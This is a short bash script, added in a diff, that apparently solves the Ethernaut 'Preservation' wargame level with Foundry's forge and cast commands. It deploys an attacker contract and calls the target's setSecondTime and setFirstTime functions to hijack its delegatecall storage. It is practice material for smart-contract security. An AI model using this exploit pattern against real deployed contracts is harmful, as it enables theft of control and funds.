@@ -1,0 +1,11 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+CON=0x3b5db0e83BaD89479F86826dF0e9E561f9cF7007
+
+# forge create --private-key $KEY '16.preservation.sol:Timezone'
+HACK=0xca643f9d363964ce9bcaaece47de7b05c98f4800
+# cast send --gas 100000 --private-key $KEY $CON 'setSecondTime(uint)' $HACK
+cast send --gas 100000 --private-key $KEY $CON 'setFirstTime(uint)' 0
